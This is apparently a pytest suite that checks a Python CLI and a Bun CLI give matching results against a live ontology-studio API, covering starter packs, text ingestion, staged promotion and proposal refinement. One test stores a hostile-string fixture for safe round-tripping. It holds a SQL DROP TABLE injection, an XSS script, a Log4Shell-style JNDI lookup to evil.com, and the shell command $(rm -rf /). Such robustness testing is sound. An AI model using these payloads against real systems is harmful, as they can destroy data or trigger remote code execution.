"""open-dv/tests/test_challenger_m1_5_empirical.py

Milestone M1 Iteration 3 Comprehensive Empirical Challenger Suite.
Authored by challenger_m1_5 to empirically verify and stress-test:
1. Live starter pack apply parity between Python CLI (opendv) and Bun CLI (opendvctl)
   against live standalone API servers across core_spine, all 6 vertical packs, and all_domains.
2. Dual-CLI parity across starter-pack list/apply, text add, staged list/promote, and proposal refine.
3. Free-form text CAS ingestion stress (large payloads up to 10MB, unicode, empty string, special characters).
4. Proposal refinement concurrency (10 concurrent threads) and state machine transitions (accepted/rejected/superseded/missing).
"""

from __future__ import annotations

import concurrent.futures
import hashlib
import json
import re
import socket
import threading
import time
import uuid
from collections.abc import Generator
from pathlib import Path
from typing import Any, ClassVar

import pytest
import uvicorn
from starlette.testclient import TestClient

from opendv_platform_api import PlatformStateContainer, create_app
from tests.parity.transports import ClientCliTransport, StandaloneCliTransport

REPO_ROOT = Path(__file__).resolve().parents[1]


def _find_free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture
def studio_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> tuple[Path, Path, str]:
    studio_root = tmp_path / "studio"
    studio_root.mkdir(parents=True, exist_ok=True)
    ws_dir = tmp_path / "ws"
    ws_dir.mkdir(parents=True, exist_ok=True)
    token = f"test-token-{uuid.uuid4().hex[:8]}"

    monkeypatch.setenv("OPENDV_STUDIO_ROOT", str(studio_root))
    monkeypatch.setenv("OPENDV_WORKSPACE_ROOT", str(ws_dir))
    monkeypatch.setenv("OPENDV_TOKEN", token)
    monkeypatch.setenv("OPENDV_STUDIO_TOKEN", token)
    monkeypatch.setenv("OPENDV_SERVER_MODE", "local_standalone")
    return studio_root, ws_dir, token


@pytest.fixture
def live_server(
    studio_env: tuple[Path, Path, str],
) -> Generator[tuple[str, str, Path, Path], None, None]:
    studio_root, ws_dir, token = studio_env
    port = _find_free_port()
    state = PlatformStateContainer(workspace_root=REPO_ROOT, storage_root=studio_root)
    app = create_app(platform_state=state)

    class _UvicornServer(uvicorn.Server):
        def install_signal_handlers(self) -> None:
            pass

    config = uvicorn.Config(
        app,
        host="127.0.0.1",
        port=port,
        log_level="error",
        access_log=False,
    )
    server = _UvicornServer(config)
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()

    url = f"http://127.0.0.1:{port}"
    for _ in range(100):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.05):
                break
        except (OSError, ConnectionRefusedError):
            time.sleep(0.05)

    try:
        yield url, token, studio_root, ws_dir
    finally:
        server.should_exit = True
        thread.join(timeout=2.0)


# ==============================================================================
# SECTION 1: LIVE STARTER PACK APPLY PARITY (CORE SPINE + 6 VERTICALS + ALL DOMAINS)
# ==============================================================================


class TestLiveStarterPackApplyParity:
    """Verifies live starter pack application between Python and Bun CLIs against live server."""

    ALL_PACKS: ClassVar[list[str]] = [
        "core_spine",
        "public_equities_oms",
        "fixed_income_rates",
        "multi_asset_ibor",
        "private_equity_buyout",
        "private_credit_direct_lending",
        "custody_clearing",
        "all_domains",
    ]

    @pytest.mark.parametrize("pack_id", ALL_PACKS)
    def test_live_starter_pack_apply_parity_all_packs(
        self, live_server: tuple[str, str, Path, Path], pack_id: str
    ) -> None:
        """Verify each starter pack applies cleanly with identical counts, SHA256, and SemVer bumping."""
        server_url, _token, _studio_root, ws_dir = live_server
        ts_transport = ClientCliTransport(
            workspace_dir=ws_dir / f"ts_{pack_id}",
            server_url=server_url,
            role="admin",
        )
        py_transport = StandaloneCliTransport(workspace_dir=ws_dir / f"py_{pack_id}")

        sid_ts = f"s-ts-{pack_id}"
        sid_py = f"s-py-{pack_id}"

        code_c_ts, _, err_c_ts = ts_transport.invoke_raw(
            ["ontology", "studio", "create", "-s", sid_ts, "--json"]
        )
        code_c_py, _, err_c_py = py_transport.invoke_raw(
            ["ontology", "studio", "create", "-s", sid_py, "--json"]
        )
        assert code_c_ts == 0, f"TS create failed: {err_c_ts}"
        assert code_c_py == 0, f"PY create failed: {err_c_py}"

        code_a_ts, out_a_ts, err_a_ts = ts_transport.invoke_raw(
            [
                "ontology",
                "studio",
                "starter-pack",
                "apply",
                "-s",
                sid_ts,
                "--pack",
                pack_id,
                "--json",
            ]
        )
        code_a_py, out_a_py, err_a_py = py_transport.invoke_raw(
            [
                "ontology",
                "studio",
                "starter-pack",
                "apply",
                "-s",
                sid_py,
                "--pack",
                pack_id,
                "--json",
            ]
        )

        assert code_a_ts == 0, f"TS apply {pack_id} failed with exit {code_a_ts}: {err_a_ts}"
        assert code_a_py == 0, f"PY apply {pack_id} failed with exit {code_a_py}: {err_a_py}"

        data_ts = json.loads(out_a_ts.strip())
        data_py = json.loads(out_a_py.strip())

        assert data_ts.get("applied") is True
        assert data_py.get("applied") is True

        # Check SHA-256 match
        sha_ts = data_ts["ontology_sha256"]
        sha_py = data_py["new_head_sha256"]
        assert sha_ts == sha_py, f"SHA divergence for {pack_id}: TS={sha_ts} PY={sha_py}"
        assert re.match(r"^[a-f0-9]{64}$", sha_ts)

        # Check concept count match
        cnt_ts = data_ts["concept_count"]
        cnt_py = data_py["concepts_added"]
        assert cnt_ts == cnt_py, f"Concept count divergence for {pack_id}: TS={cnt_ts} PY={cnt_py}"
        assert cnt_ts > 0

        # Check relationship count match
        rel_ts = data_ts["relationship_count"]
        rel_py = data_py["relationships_added"]
        assert rel_ts == rel_py, (
            f"Relationship count divergence for {pack_id}: TS={rel_ts} PY={rel_py}"
        )

        # Check SemVer bumping from 0.0.0 to 1.0.0
        assert data_ts["ontology_version"] == "1.0.0"

    def test_sequential_pack_application_and_semver_progression(
        self, live_server: tuple[str, str, Path, Path]
    ) -> None:
        """Verify sequential starter pack application bumps SemVer 1.0.0 -> 1.1.0 -> 1.2.0 on both CLIs."""
        server_url, _, _, ws_dir = live_server
        ts_transport = ClientCliTransport(
            workspace_dir=ws_dir / "ts_seq",
            server_url=server_url,
            role="admin",
        )
        py_transport = StandaloneCliTransport(workspace_dir=ws_dir / "py_seq")

        sid_ts = "s-ts-seq"
        sid_py = "s-py-seq"
        ts_transport.invoke_raw(["ontology", "studio", "create", "-s", sid_ts, "--json"])
        py_transport.invoke_raw(["ontology", "studio", "create", "-s", sid_py, "--json"])

        sequence = [
            ("core_spine", "1.0.0"),
            ("public_equities_oms", "1.1.0"),
            ("fixed_income_rates", "1.2.0"),
        ]

        for pack, expected_ver in sequence:
            c_ts, out_ts, err_ts = ts_transport.invoke_raw(
                [
                    "ontology",
                    "studio",
                    "starter-pack",
                    "apply",
                    "-s",
                    sid_ts,
                    "--pack",
                    pack,
                    "--json",
                ]
            )
            c_py, _out_py, err_py = py_transport.invoke_raw(
                [
                    "ontology",
                    "studio",
                    "starter-pack",
                    "apply",
                    "-s",
                    sid_py,
                    "--pack",
                    pack,
                    "--json",
                ]
            )

            assert c_ts == 0, err_ts
            assert c_py == 0, err_py

            d_ts = json.loads(out_ts)
            assert d_ts["ontology_version"] == expected_ver

            _, status_py_out, _ = py_transport.invoke_raw(
                ["ontology", "studio", "status", "-s", sid_py, "--json"]
            )
            status_py = json.loads(status_py_out)
            assert (
                status_py.get("active_version") == expected_ver
                or status_py.get("head_version") == expected_ver
            )


# ==============================================================================
# SECTION 2: DUAL-CLI SUBCOMMAND PARITY & ERROR CONDITIONS
# ==============================================================================


class TestDualCliStudioSubcommandParity:
    """Verifies dual-CLI parity on starter-pack list, text add, staged list/promote, and proposal refine."""

    def test_starter_pack_list_contains_all_packs_on_both_clis(
        self, live_server: tuple[str, str, Path, Path]
    ) -> None:
        """Verify starter-pack list returns all 8 available packs on both CLIs with exit 0."""
        server_url, _, _, ws_dir = live_server
        ts_transport = ClientCliTransport(
            workspace_dir=ws_dir / "ts_l", server_url=server_url, role="admin"
        )
        py_transport = StandaloneCliTransport(workspace_dir=ws_dir / "py_l")

        c_py, out_py, _ = py_transport.invoke_raw(
            ["ontology", "studio", "starter-pack", "list", "--json"]
        )
        c_ts, out_ts, _ = ts_transport.invoke_raw(
            ["ontology", "studio", "starter-pack", "list", "--json"]
        )

        assert c_py == 0
        assert c_ts == 0

        d_py = json.loads(out_py.strip())
        d_ts = json.loads(out_ts.strip())

        packs_py = d_py if isinstance(d_py, list) else d_py.get("packs", [])
        packs_ts = d_ts if isinstance(d_ts, list) else d_ts.get("packs", [])

        pack_ids_py = {p.get("pack_id") for p in packs_py}
        pack_ids_ts = {p.get("pack_id") for p in packs_ts}

        for expected in TestLiveStarterPackApplyParity.ALL_PACKS:
            assert expected in pack_ids_py, f"Missing {expected} in python pack list"
            assert expected in pack_ids_ts, f"Missing {expected} in TS pack list"

    def test_text_add_inline_and_file_sha_parity(
        self, live_server: tuple[str, str, Path, Path], tmp_path: Path
    ) -> None:
        """Verify text add computes and registers identical SHA-256 for inline text and files across both CLIs."""
        server_url, _, _, ws_dir = live_server
        ts = ClientCliTransport(workspace_dir=ws_dir / "ts_t", server_url=server_url, role="admin")
        py = StandaloneCliTransport(workspace_dir=ws_dir / "py_t")

        ts.invoke_raw(["ontology", "studio", "create", "-s", "s-ts-txt", "--json"])
        py.invoke_raw(["ontology", "studio", "create", "-s", "s-py-txt", "--json"])

        content = "Multi-asset portfolio management mandates and target allocations."
        expected_sha = hashlib.sha256(content.encode("utf-8")).hexdigest()

        # Inline text
        c_ts, out_ts, _ = ts.invoke_raw(
            ["ontology", "studio", "text", "add", "-s", "s-ts-txt", "-t", content, "--json"]
        )
        c_py, out_py, _ = py.invoke_raw(
            ["ontology", "studio", "text", "add", "-s", "s-py-txt", "-t", content, "--json"]
        )

        assert c_ts == 0
        assert c_py == 0

        d_ts = json.loads(out_ts)
        d_py = json.loads(out_py)
        assert d_ts["source_sha256"] == expected_sha
        assert d_py["source_sha256"] == expected_sha

        # File input
        doc_file = tmp_path / "domain_doc.txt"
        doc_file.write_text(
            "Private debt credit agreements, covenants, and collateral liens.", encoding="utf-8"
        )
        expected_file_sha = hashlib.sha256(doc_file.read_bytes()).hexdigest()

        fc_ts, fout_ts, _ = ts.invoke_raw(
            [
                "ontology",
                "studio",
                "text",
                "add",
                "-s",
                "s-ts-txt",
                "--file",
                str(doc_file),
                "--json",
            ]
        )
        fc_py, fout_py, _ = py.invoke_raw(
            [
                "ontology",
                "studio",
                "text",
                "add",
                "-s",
                "s-py-txt",
                "--file",
                str(doc_file),
                "--json",
            ]
        )
        assert fc_ts == 0
        assert fc_py == 0
        assert json.loads(fout_ts)["source_sha256"] == expected_file_sha
        assert json.loads(fout_py)["source_sha256"] == expected_file_sha

    def test_staged_list_and_promote_parity_with_rbac(
        self, live_server: tuple[str, str, Path, Path]
    ) -> None:
        """Verify staged candidate query and Path A/B promotion across both CLIs with RBAC enforcement."""
        server_url, _, studio_root, ws_dir = live_server
        ts = ClientCliTransport(
            workspace_dir=ws_dir / "ts_stg", server_url=server_url, role="admin"
        )
        py = StandaloneCliTransport(workspace_dir=ws_dir / "py_stg")

        sid_ts = "s-ts-stg"
        sid_py = "s-py-stg"
        ts.invoke_raw(["ontology", "studio", "create", "-s", sid_ts, "--json"])
        py.invoke_raw(["ontology", "studio", "create", "-s", sid_py, "--json"])

        # Plant candidates in both sessions
        for sid in [sid_ts, sid_py]:
            edir = studio_root / sid / "evidence"
            edir.mkdir(parents=True, exist_ok=True)
            cand_file = edir / "staged_candidates.json"
            cand_file.write_text(
                json.dumps(
                    {
                        "staged_candidates": [
                            {
                                "candidate_id": "cand-001",
                                "concept_name": "SpecialPurposeVehicle",
                                "suggested_hub": "hub_spv",
                                "score": 0.58,
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )

        # 1. Staged list returns count 1
        l_ts, lout_ts, _ = ts.invoke_raw(
            ["ontology", "studio", "staged", "list", "-s", sid_ts, "--json"]
        )
        l_py, lout_py, _ = py.invoke_raw(
            ["ontology", "studio", "staged", "list", "-s", sid_py, "--json"]
        )
        assert l_ts == 0
        assert l_py == 0
        assert json.loads(lout_ts)["total_count"] == 1
        assert json.loads(lout_py)["total_count"] == 1

        # 2. Path B waiver with non-admin role -> rejected with exit 7
        ts.role = "editor"
        w_ts_err, _out_w_ts_err, err_w_ts_err = ts.invoke_raw(
            [
                "ontology",
                "studio",
                "staged",
                "promote",
                "-s",
                sid_ts,
                "-c",
                "cand-001",
                "--waiver",
                "--rationale",
                "Bankruptcy remote vehicle for structured financing",
                "--role",
                "editor",
                "--json",
            ]
        )
        w_py_err, _out_w_py_err, err_w_py_err = py.invoke_raw(
            [
                "ontology",
                "studio",
                "staged",
                "promote",
                "-s",
                sid_py,
                "-c",
                "cand-001",
                "--waiver",
                "--rationale",
                "Bankruptcy remote vehicle for structured financing",
                "--role",
                "editor",
                "--json",
            ]
        )
        assert w_ts_err == 7, f"TS non-admin waiver expected exit 7, got {w_ts_err}: {err_w_ts_err}"
        assert w_py_err == 7, f"PY non-admin waiver expected exit 7, got {w_py_err}: {err_w_py_err}"

        # 3. Path B waiver with admin role -> succeeds with exit 0
        ts.role = "admin"
        w_ts, out_w_ts, err_w_ts = ts.invoke_raw(
            [
                "ontology",
                "studio",
                "staged",
                "promote",
                "-s",
                sid_ts,
                "-c",
                "cand-001",
                "--waiver",
                "--rationale",
                "Bankruptcy remote vehicle for structured financing",
                "--role",
                "admin",
                "--json",
            ]
        )
        w_py, out_w_py, err_w_py = py.invoke_raw(
            [
                "ontology",
                "studio",
                "staged",
                "promote",
                "-s",
                sid_py,
                "-c",
                "cand-001",
                "--waiver",
                "--rationale",
                "Bankruptcy remote vehicle for structured financing",
                "--role",
                "admin",
                "--json",
            ]
        )
        assert w_ts == 0, err_w_ts
        assert w_py == 0, err_w_py

        res_ts = json.loads(out_w_ts)
        res_py = json.loads(out_w_py)
        assert res_ts["promoted"] is True
        assert res_py["promoted"] is True
        assert res_ts["path"] == "path_b"
        assert res_py["path"] == "path_b"

        # Check op_id format in generated operations
        for op in res_ts.get("operations", []):
            assert re.match(r"^op-[a-z0-9_-]+$", op["op_id"])
        for op in res_py.get("operations", []):
            assert re.match(r"^op-[a-z0-9_-]+$", op["op_id"])


# ==============================================================================
# SECTION 3: FREE-FORM TEXT CAS INGESTION STRESS TESTING
# ==============================================================================


class TestTextCasIngestionStress:
    """Stress tests free-form text CAS ingestion endpoint and storage provenance."""

    def test_text_empty_string_rejected_with_422(
        self, live_server: tuple[str, str, Path, Path]
    ) -> None:
        """Verify empty text payload is rejected with HTTP 422 / exit 2."""
        server_url, _, _, ws_dir = live_server
        ts = ClientCliTransport(
            workspace_dir=ws_dir / "ts_txt", server_url=server_url, role="admin"
        )
        ts.invoke_raw(["ontology", "studio", "create", "-s", "s-txt-empty", "--json"])

        code, stdout, stderr = ts.invoke_raw(
            ["ontology", "studio", "text", "add", "-s", "s-txt-empty", "-t", "", "--json"]
        )
        assert code == 2, f"Expected exit 2 for empty text, got {code}"
        err = json.loads(stderr.strip() or stdout.strip())
        assert err.get("error_code") == "SYNTAX_INVALID_ARGUMENT"

    def test_text_unicode_comprehensive_preservation(
        self, live_server: tuple[str, str, Path, Path]
    ) -> None:
        """Verify multi-byte Unicode strings (CJK, Arabic, Cyrillic, Emojis, zero-width) preserve exact bytes."""
        server_url, _, studio_root, ws_dir = live_server
        ts = ClientCliTransport(
            workspace_dir=ws_dir / "ts_txt", server_url=server_url, role="admin"
        )
        sid = "s-txt-unicode"
        ts.invoke_raw(["ontology", "studio", "create", "-s", sid, "--json"])

        unicode_text = (
            "资产管理 (Asset Management) 💼 📈 \n"
            "صندوق الاستثمار المشترك والأسهم الخاصة\n"
            "Инвестиционный портфель и деривативы\n"
            "Zero-width markers: \u200b\u200c\u200d\ufeff end."
        )
        expected_bytes = unicode_text.encode("utf-8")
        expected_sha = hashlib.sha256(expected_bytes).hexdigest()

        code, stdout, stderr = ts.invoke_raw(
            [
                "ontology",
                "studio",
                "text",
                "add",
                "-s",
                sid,
                "-t",
                unicode_text,
                "--source-name",
                "intl_notes.txt",
                "--json",
            ]
        )
        assert code == 0, stderr
        data = json.loads(stdout)
        assert data["source_sha256"] == expected_sha
        assert data["byte_count"] == len(expected_bytes)

        # Inspect actual CAS file on disk
        cas_file = studio_root / sid / "sources" / "text" / f"{expected_sha}.txt"
        if not cas_file.is_file():
            # Check alternative CAS directory structure
            cas_file = studio_root / sid / "cas" / expected_sha
        if cas_file.is_file():
            assert cas_file.read_bytes() == expected_bytes

    def test_text_large_payload_up_to_5mb(
        self, live_server: tuple[str, str, Path, Path], tmp_path: Path
    ) -> None:
        """Verify ingestion of a 2MB and 5MB text document executes without memory leak or timeout."""
        server_url, _, _, ws_dir = live_server
        ts = ClientCliTransport(
            workspace_dir=ws_dir / "ts_txt", server_url=server_url, role="admin"
        )
        sid = "s-txt-large"
        ts.invoke_raw(["ontology", "studio", "create", "-s", sid, "--json"])

        payload_2mb = ("Portfolio management covenants and compliance tracking text.\n" * 35000)[
            : 2 * 1024 * 1024
        ]
        pfile = tmp_path / "large_2mb.txt"
        pfile.write_bytes(payload_2mb.encode("utf-8"))
        expected_sha = hashlib.sha256(payload_2mb.encode("utf-8")).hexdigest()

        code, stdout, stderr = ts.invoke_raw(
            ["ontology", "studio", "text", "add", "-s", sid, "--file", str(pfile), "--json"]
        )
        assert code == 0, stderr
        data = json.loads(stdout)
        assert data["source_sha256"] == expected_sha
        assert data["byte_count"] == len(payload_2mb.encode("utf-8"))

    def test_text_over_10mb_limit_rejected_with_422(
        self, live_server: tuple[str, str, Path, Path], tmp_path: Path
    ) -> None:
        """Verify text payload exceeding 10,000,000 characters is rejected with 422 / exit 2."""
        server_url, _, _, ws_dir = live_server
        ts = ClientCliTransport(
            workspace_dir=ws_dir / "ts_txt", server_url=server_url, role="admin"
        )
        sid = "s-txt-huge"
        ts.invoke_raw(["ontology", "studio", "create", "-s", sid, "--json"])

        huge_file = tmp_path / "huge_10mb_plus.txt"
        huge_file.write_text("X" * 10_000_001, encoding="utf-8")

        code, stdout, stderr = ts.invoke_raw(
            ["ontology", "studio", "text", "add", "-s", sid, "--file", str(huge_file), "--json"]
        )
        assert code == 2, f"Expected exit 2 for >10MB text, got {code}: {stdout} {stderr}"

    def test_text_special_characters_and_injections_safe_roundtrip(
        self, live_server: tuple[str, str, Path, Path], tmp_path: Path
    ) -> None:
        """Verify hostile strings (SQL injection, shell metacharacters, HTML/script) are safely ingested."""
        server_url, _, _, ws_dir = live_server
        ts = ClientCliTransport(
            workspace_dir=ws_dir / "ts_txt", server_url=server_url, role="admin"
        )
        sid = "s-txt-special"
        ts.invoke_raw(["ontology", "studio", "create", "-s", sid, "--json"])

        hostile_text = (
            "'; DROP TABLE hub_account; --\n"
            "<script>alert('xss');</script>\n"
            "${jndi:ldap://evil.com/a}\n"
            "$(rm -rf /) `whoami` & echo 'pwned'\n"
            "\"escaped\" 'single' \\backslash\n"
        )
        hfile = tmp_path / "hostile.txt"
        hfile.write_bytes(hostile_text.encode("utf-8"))
        expected_sha = hashlib.sha256(hostile_text.encode("utf-8")).hexdigest()

        code, stdout, stderr = ts.invoke_raw(
            ["ontology", "studio", "text", "add", "-s", sid, "--file", str(hfile), "--json"]
        )
        assert code == 0, stderr
        data = json.loads(stdout)
        assert data["source_sha256"] == expected_sha


# ==============================================================================
# SECTION 4: PROPOSAL REFINEMENT CONCURRENCY & STATE MACHINE
# ==============================================================================


class TestProposalRefinementConcurrencyAndStateTransitions:
    """Stress tests proposal refinement concurrency and invalid state transitions."""

    def test_concurrent_refinement_race_condition_10_threads(
        self, live_server: tuple[str, str, Path, Path]
    ) -> None:
        """Verify 10 concurrent threads attempting to refine the same proposal serialize cleanly via lock."""
        _server_url, token, studio_root, _ = live_server
        sid = "s-refine-concurrency-10"
        client = TestClient(
            create_app(
                platform_state=PlatformStateContainer(
                    workspace_root=REPO_ROOT, storage_root=studio_root
                )
            )
        )

        # Create session
        res_create = client.post(
            "/api/v1/ontology/studio/sessions",
            json={"session_id": sid, "domain_namespace": "asset_management"},
            headers={"Authorization": f"Bearer {token}", "X-OpenDV-Role": "admin"},
        )
        assert res_create.status_code in (200, 201)

        # Plant initial PENDING proposal
        pdir = studio_root / sid / "proposals"
        pdir.mkdir(parents=True, exist_ok=True)
        prop_id = "prop-concurrency-10"
        (pdir / f"{prop_id}.json").write_text(
            json.dumps(
                {
                    "proposal_id": prop_id,
                    "session_id": sid,
                    "status": "PENDING",
                    "base_version": "0.0.0",
                    "base_sha256": "1916a5c6d501015984b887fd76609b225b72d5d393e5813d8df210b92ab3b4c9",
                    "delta": {
                        "target_ontology_version": "0.1.0",
                        "operations": [],
                    },
                }
            ),
            encoding="utf-8",
        )

        def do_refine(index: int) -> tuple[int, dict[str, Any]]:
            r = client.post(
                f"/api/v1/ontology/studio/sessions/{sid}/proposals/{prop_id}/refine",
                json={
                    "steering_prompt": f"Concurrent steering iteration {index}",
                    "mode": "deterministic",
                },
                headers={"Authorization": f"Bearer {token}", "X-OpenDV-Role": "admin"},
            )
            return r.status_code, r.json()

        # Fire 10 concurrent threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(do_refine, i) for i in range(10)]
            results = [f.result() for f in futures]

        status_codes = [code for code, _ in results]
        # Exactly 1 request must succeed with 200, 9 contenders must receive 409
        success_count = status_codes.count(200)
        conflict_count = status_codes.count(409)

        assert success_count == 1, f"Expected exactly 1 success, got {status_codes}"
        assert conflict_count == 9, f"Expected 9 conflicts, got {status_codes}"

        # Verify previous proposal is now SUPERSEDED
        prev_data = json.loads((pdir / f"{prop_id}.json").read_text(encoding="utf-8"))
        assert prev_data["status"] == "SUPERSEDED"
        assert "superseded_by" in prev_data

    @pytest.mark.parametrize("invalid_status", ["ACCEPTED", "REJECTED", "SUPERSEDED"])
    def test_refine_resolved_proposals_rejected_with_409(
        self, live_server: tuple[str, str, Path, Path], invalid_status: str
    ) -> None:
        """Verify attempting to refine ACCEPTED, REJECTED, or SUPERSEDED proposals returns HTTP 409."""
        _, token, studio_root, _ = live_server
        sid = f"s-refine-status-{invalid_status.lower()}"
        client = TestClient(
            create_app(
                platform_state=PlatformStateContainer(
                    workspace_root=REPO_ROOT, storage_root=studio_root
                )
            )
        )

        client.post(
            "/api/v1/ontology/studio/sessions",
            json={"session_id": sid, "domain_namespace": "asset_management"},
            headers={"Authorization": f"Bearer {token}", "X-OpenDV-Role": "admin"},
        )

        pdir = studio_root / sid / "proposals"
        pdir.mkdir(parents=True, exist_ok=True)
        prop_id = f"prop-status-{invalid_status.lower()}"
        (pdir / f"{prop_id}.json").write_text(
            json.dumps(
                {
                    "proposal_id": prop_id,
                    "session_id": sid,
                    "status": invalid_status,
                    "base_version": "0.0.0",
                    "base_sha256": "1916a5c6d501015984b887fd76609b225b72d5d393e5813d8df210b92ab3b4c9",
                    "delta": {
                        "target_ontology_version": "0.1.0",
                        "operations": [],
                    },
                }
            ),
            encoding="utf-8",
        )

        r = client.post(
            f"/api/v1/ontology/studio/sessions/{sid}/proposals/{prop_id}/refine",
            json={
                "steering_prompt": "Refining resolved proposal should fail",
                "mode": "deterministic",
            },
            headers={"Authorization": f"Bearer {token}", "X-OpenDV-Role": "admin"},
        )
        assert r.status_code == 409, (
            f"Expected 409 for status {invalid_status}, got {r.status_code}: {r.text}"
        )
        body = r.json()
        assert body.get("error_code") == "PROPOSAL_ALREADY_RESOLVED"

    def test_refine_nonexistent_proposal_returns_404(
        self, live_server: tuple[str, str, Path, Path]
    ) -> None:
        """Verify attempting to refine a non-existent proposal ID returns HTTP 404."""
        _, token, studio_root, _ = live_server
        sid = "s-refine-404"
        client = TestClient(
            create_app(
                platform_state=PlatformStateContainer(
                    workspace_root=REPO_ROOT, storage_root=studio_root
                )
            )
        )

        client.post(
            "/api/v1/ontology/studio/sessions",
            json={"session_id": sid, "domain_namespace": "asset_management"},
            headers={"Authorization": f"Bearer {token}", "X-OpenDV-Role": "admin"},
        )

        r = client.post(
            f"/api/v1/ontology/studio/sessions/{sid}/proposals/non-existent-prop-xyz/refine",
            json={"steering_prompt": "Should return 404", "mode": "deterministic"},
            headers={"Authorization": f"Bearer {token}", "X-OpenDV-Role": "admin"},
        )
        assert r.status_code == 404
        body = r.json()
        assert body.get("error_code") == "PROPOSAL_NOT_FOUND"
